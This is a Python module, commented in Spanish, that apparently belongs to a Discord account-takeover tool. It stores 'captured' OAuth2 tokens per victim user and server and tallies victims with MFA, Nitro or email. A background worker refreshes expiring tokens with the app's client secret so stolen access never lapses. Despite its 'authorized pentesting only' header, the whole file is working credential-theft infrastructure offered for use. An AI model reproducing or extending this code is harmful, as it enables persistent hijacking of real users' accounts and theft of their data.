# token_manager.py
# Almacena, refresca y gestiona tokens OAuth2 capturados
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

import json
import os
import datetime
import threading
import time
import requests
import logging
from config import config

logger = logging.getLogger("TokenManager")

class TokenManager:
    def __init__(self):
        self.tokens_file = os.path.join(config.LOG_DIR, "captured_tokens.json")
        self.lock = threading.Lock()
        self._ensure_data_dir()
        self._start_refresh_worker()

    def _ensure_data_dir(self):
        os.makedirs(config.LOG_DIR, exist_ok=True)
        if not os.path.exists(self.tokens_file):
            self._save_tokens([])

    def _load_tokens(self):
        try:
            with open(self.tokens_file, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return []

    def _save_tokens(self, tokens):
        with open(self.tokens_file, "w") as f:
            json.dump(tokens, f, indent=2, default=str)

    def add_token(self, token_data):
        with self.lock:
            tokens = self._load_tokens()
            user_id = token_data.get("user_id")
            replaced = False
            for i, t in enumerate(tokens):
                if t.get("user_id") == user_id:
                    tokens[i] = token_data
                    replaced = True
                    break
            if not replaced:
                tokens.append(token_data)
            self._save_tokens(tokens)
            logger.info(f"Token {'actualizado' if replaced else 'nuevo'} para {token_data.get('username')} ({user_id})")
            return True

    def get_token(self, user_id):
        with self.lock:
            tokens = self._load_tokens()
            for t in tokens:
                if t.get("user_id") == user_id:
                    return t
            return None

    def get_all_tokens(self, guild_id=None):
        with self.lock:
            tokens = self._load_tokens()
            if guild_id:
                return [t for t in tokens if str(t.get("guild_id")) == str(guild_id)]
            return tokens

    def get_stats(self):
        tokens = self._load_tokens()
        now = datetime.datetime.now()
        valid = expired = with_mfa = with_nitro = with_email = 0
        for t in tokens:
            expires_at = t.get("expires_at")
            if expires_at:
                try:
                    exp = datetime.datetime.fromisoformat(expires_at)
                    if exp > now:
                        valid += 1
                    else:
                        expired += 1
                except:
                    valid += 1
            else:
                valid += 1
            if t.get("mfa_enabled"):
                with_mfa += 1
            if t.get("premium_type", 0) > 0:
                with_nitro += 1
            if t.get("email"):
                with_email += 1
        return {
            "total": len(tokens),
            "valid": valid,
            "expired": expired,
            "with_mfa": with_mfa,
            "without_mfa": len(tokens) - with_mfa,
            "with_nitro": with_nitro,
            "with_email": with_email,
            "unique_guilds": len(set(str(t.get("guild_id")) for t in tokens if t.get("guild_id")))
        }

    def refresh_token(self, token_entry):
        if not token_entry.get("refresh_token"):
            return None
        data = {
            "client_id": config.CLIENT_ID,
            "client_secret": config.CLIENT_SECRET,
            "grant_type": "refresh_token",
            "refresh_token": token_entry["refresh_token"]
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = requests.post(
                "https://discord.com/api/v9/oauth2/token",
                data=data,
                headers=headers,
                timeout=10
            )
            if r.status_code == 200:
                new_data = r.json()
                expires_in = new_data.get("expires_in", 604800)
                token_entry["access_token"] = new_data["access_token"]
                token_entry["refresh_token"] = new_data.get("refresh_token", token_entry["refresh_token"])
                token_entry["expires_at"] = (
                    datetime.datetime.now() + datetime.timedelta(seconds=expires_in)
                ).isoformat()
                logger.info(f"Token refrescado para {token_entry.get('username')}")
                return token_entry
            else:
                logger.warning(f"No se pudo refrescar token: {r.status_code}")
                return None
        except Exception as e:
            logger.error(f"Error refrescando token: {e}")
            return None

    def _start_refresh_worker(self):
        if not config.AUTO_REFRESH_TOKENS:
            return
        def worker():
            while True:
                try:
                    self._auto_refresh_expiring_tokens()
                except Exception as e:
                    logger.error(f"Error en worker de refresh: {e}")
                time.sleep(3600)
        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        logger.info("Worker de auto-refresh iniciado")

    def _auto_refresh_expiring_tokens(self):
        with self.lock:
            tokens = self._load_tokens()
            now = datetime.datetime.now()
            threshold = datetime.timedelta(hours=config.REFRESH_THRESHOLD_HOURS)
            changed = False
            for i, t in enumerate(tokens):
                expires_at = t.get("expires_at")
                if not expires_at:
                    continue
                try:
                    exp = datetime.datetime.fromisoformat(expires_at)
                    if exp - now < threshold:
                        refreshed = self.refresh_token(t)
                        if refreshed:
                            tokens[i] = refreshed
                            changed = True
                except:
                    pass
            if changed:
                self._save_tokens(tokens)

    def cleanup_expired(self):
        with self.lock:
            tokens = self._load_tokens()
            now = datetime.datetime.now()
            valid_tokens = []
            removed = 0
            for t in tokens:
                expires_at = t.get("expires_at")
                if expires_at:
                    try:
                        exp = datetime.datetime.fromisoformat(expires_at)
                        if exp > now:
                            valid_tokens.append(t)
                        else:
                            if not self.refresh_token(t):
                                removed += 1
                            else:
                                valid_tokens.append(t)
                    except:
                        valid_tokens.append(t)
                else:
                    valid_tokens.append(t)
            if removed:
                self._save_tokens(valid_tokens)
                logger.info(f"Limpieza: {removed} tokens expirados eliminados")
            return removed

token_manager = TokenManager()
